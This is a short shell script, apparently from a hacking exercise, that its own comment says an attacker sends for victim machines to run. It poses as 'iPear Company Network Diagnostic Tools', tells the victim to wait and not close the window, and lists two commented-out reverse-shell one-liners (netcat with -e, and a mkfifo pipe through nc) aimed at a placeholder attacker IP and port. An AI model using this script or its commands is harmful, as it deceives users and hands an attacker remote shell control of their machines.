#!/bin/sh

# This script (sent by the attacker) is executed by the VICTIM machines

echo '***** Welcome to iPear Company Network Diagnostic Tools *****\n'
sleep 2
echo 'Please sit back and wait... we are detecting whats wrong on your device. It may take 10-15 mins.'
echo 'Reminder: Dont close this window! Your network will be slow again if you do so!'

# netcat on Kali Linux supports -e option
# nc -e /bin/bash ATTACKERS_IP_ADDRESS PORT_NUMBER

# use the following on other Linux distros
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKERS_IP_ADDRESS PORT_NUMBER >/tmp/f
